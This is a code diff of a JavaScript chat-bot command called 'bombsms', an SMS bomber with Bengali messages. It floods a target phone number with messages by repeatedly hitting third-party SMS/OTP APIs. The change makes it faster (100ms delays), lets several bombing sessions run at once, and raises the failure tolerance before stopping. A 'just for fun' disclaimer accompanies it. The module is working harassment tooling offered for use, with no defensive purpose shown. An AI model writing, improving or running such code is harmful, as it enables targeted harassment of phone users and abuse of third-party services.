@@ -4,17 +4,18 @@ function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-const bombingFlags = {};
+const bombingFlags = {}; // ThreadID based
+const activeBombings = {}; // Track all active bombings
 
 module.exports = {
   config: {
     name: "bombsms",
-    version: "5.0.0",
-    author: "OMOR TE from THE DARK WEB",
+    version: "3.0.0",
+    author: "OMOR TE",
     countDown: 0,
     role: 2,
     shortDescription: "SMS Bomber",
-    longDescription: "Super-fast SMS bombing tool",
+    longDescription: "SMS bombing tool - Multiple numbers supported",
     guide: "{p}bombsms 01xxxxxxxxx limit | {p}bombsms off",
     category: "tool"
   },
@@ -22,12 +23,19 @@ module.exports = {
   onStart: async function ({ message, event, args, api }) {
     const threadID = event.threadID;
     
+    // GLOBAL OFF - সব বন্ধ করবে
     if (args[0] === "off") {
-      if (bombingFlags[threadID]) {
-        bombingFlags[threadID] = false;
-        return message.reply("✅ SMS বোম্বার বন্ধ করা হয়েছে।");
+      let count = 0;
+      for (const key in activeBombings) {
+        if (activeBombings[key] === true) {
+          activeBombings[key] = false;
+          count++;
+        }
+      }
+      if (count > 0) {
+        return message.reply(`✅ **${count}** টি বোম্বিং বন্ধ করা হয়েছে।`);
       } else {
-        return message.reply("❗ এই থ্রেডে কোনো বোম্বিং চলছিল না।");
+        return message.reply("❗ কোনো বোম্বিং চলছিল না।");
       }
     }
 
@@ -35,7 +43,7 @@ module.exports = {
     const limitInput = args[1];
     
     if (!num || !limitInput) {
-      return message.reply(`📱 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📌 ব্যবহার: bombsms 01xxxxxxxxx 50\n📌 বন্ধ: bombsms off\n━━━━━━━━━━━━━━━━━━━━\n⚠️ শুধু মজার জন্য ব্যবহার করুন`);
+      return message.reply(`📱 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📌 ব্যবহার: bombsms 01xxxxxxxxx 50\n📌 একাধিক: প্রতিটি কমান্ড আলাদাভাবে\n📌 বন্ধ: bombsms off (সব বন্ধ হবে)\n━━━━━━━━━━━━━━━━━━━━\n⚠️ শুধু মজার জন্য ব্যবহার করুন`);
     }
     
     if (!/^01[0-9]{9}$/.test(num)) {
@@ -47,14 +55,24 @@ module.exports = {
       return message.reply("❌ সঠিক সংখ্যা দিন (যেমন: 50)");
     }
     
+    // Unique ID for this bombing session
+    const sessionId = `${threadID}_${num}_${Date.now()}`;
+    
     if (bombingFlags[threadID]) {
-      return message.reply("❗ বোম্বিং চলছে! বন্ধ করতে: bombsms off");
+      return message.reply(`❗ বোম্বিং চলছে! বন্ধ করতে: bombsms off\n🔔 আপনার নতুন বোম্বিং ${num} নম্বরে যুক্ত হয়েছে।`);
     }
 
     bombingFlags[threadID] = true;
+    activeBombings[sessionId] = true;
 
-    // First message at 0%
-    const progressMsg = await message.reply(`🚀 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 0/${limit} (0%)\n┣${"░".repeat(20)}┫\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`);
+    // Fast progress tracking
+    let sent = 0;
+    let consecutiveFailures = 0;
+    let lastPercent = 0;
+    let editCount = 0;
+    
+    // Start message
+    const progressMsg = await message.reply(`🚀 **SMS BOMBER #${Object.keys(activeBombings).length}**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 0/${limit} (0%)\n┣${"░".repeat(20)}┫\n━━━━━━━━━━━━━━━━━━━━\n⚡ স্পীড: ফাস্ট\n⏳ চলছে...`);
 
     // API configs
     const headers = {
@@ -255,68 +273,84 @@ module.exports = {
       async () => await axios.get(url10, { headers: headers10 })
     ];
     
-    // FAST SPEED - very little delay
-    let sent = 0;
-    let consecutiveFailures = 0;
-    let lastUpdatePercent = 0;
-    
-    for (let cycle = 0; cycle < Math.ceil(limit / apiCalls.length) && sent < limit && bombingFlags[threadID]; cycle++) {
-      for (let i = 0; i < apiCalls.length && sent < limit && bombingFlags[threadID]; i++) {
-        try {
-          const response = await apiCalls[i]();
-          if (response && (response.status === 200 || response.status === 201)) {
-            sent++;
-            consecutiveFailures = 0;
-            
-            const newPercent = Math.floor((sent / limit) * 100);
-            const updateThresholds = [25, 50, 75, 100];
-            
-            if (updateThresholds.includes(newPercent) && newPercent > lastUpdatePercent) {
-              lastUpdatePercent = newPercent;
-              const progressBar = getProgressBar(newPercent, 20);
+    // FAST BOMBING LOOP
+    (async () => {
+      while (sent < limit && activeBombings[sessionId]) {
+        let cycleSuccess = false;
+        
+        for (let i = 0; i < apiCalls.length && sent < limit && activeBombings[sessionId]; i++) {
+          try {
+            const response = await apiCalls[i]();
+            if (response && (response.status === 200 || response.status === 201)) {
+              sent++;
+              cycleSuccess = true;
+              consecutiveFailures = 0;
               
-              await api.editMessage(
-                `🚀 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${newPercent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`,
-                progressMsg.messageID
-              );
+              const newPercent = Math.floor((sent / limit) * 100);
+              
+              // Update at 25%, 50%, 75%, 100%
+              if (newPercent >= 25 && newPercent > lastPercent) {
+                lastPercent = newPercent;
+                const progressBar = getProgressBar(newPercent, 20);
+                try {
+                  await api.editMessage(
+                    `🚀 **SMS BOMBER #${Object.keys(activeBombings).length}**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${newPercent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⚡ ফাস্ট মোড\n⏳ চলছে...`,
+                    progressMsg.messageID
+                  );
+                } catch(e) {}
+              } else if (sent === limit) {
+                const progressBar = getProgressBar(100, 20);
+                try {
+                  await api.editMessage(
+                    `✅ **SMS BOMBER COMPLETED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (100%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⚡ MW LEGENDS`,
+                    progressMsg.messageID
+                  );
+                } catch(e) {}
+              }
             }
+          } catch (error) {
+            consecutiveFailures++;
           }
-        } catch (error) {
-          consecutiveFailures++;
+          
+          // Super fast: 100ms delay
+          await sleep(100);
+          
+          if (!activeBombings[sessionId]) break;
         }
         
-        // FAST: only 150ms delay (very fast)
-        await sleep(150);
+        if (!cycleSuccess) {
+          consecutiveFailures++;
+          await sleep(500);
+        }
         
-        if (!bombingFlags[threadID]) break;
+        if (consecutiveFailures > 50) {
+          try {
+            await api.editMessage(
+              `⚠️ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n⚠️ API limit reached\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━`,
+              progressMsg.messageID
+            );
+          } catch(e) {}
+          break;
+        }
+        
+        await sleep(200);
       }
       
-      if (consecutiveFailures > 30) {
-        await api.editMessage(
-          `⚠️ **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n⚠️ API limit reached\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n⏸️ Paused...`,
-          progressMsg.messageID
-        );
-        break;
-      }
-      
-      await sleep(300);
-    }
-    
-    if (bombingFlags[threadID]) {
+      // Cleanup
+      delete activeBombings[sessionId];
       bombingFlags[threadID] = false;
-      const percent = Math.floor((sent / limit) * 100);
-      const progressBar = getProgressBar(percent, 20);
       
-      await api.editMessage(
-        `✅ **SMS BOMBER COMPLETED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${percent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⚡ MW LEGENDS`,
-        progressMsg.messageID
-      );
-    } else {
-      await api.editMessage(
-        `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n🛑 বন্ধ করা হয়েছে`,
-        progressMsg.messageID
-      );
-    }
+      if (sent >= limit) {
+        // Already completed message sent
+      } else if (!activeBombings[sessionId]) {
+        try {
+          await api.editMessage(
+            `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n🛑 বন্ধ করা হয়েছে`,
+            progressMsg.messageID
+          );
+        } catch(e) {}
+      }
+    })();
   }
 };
 
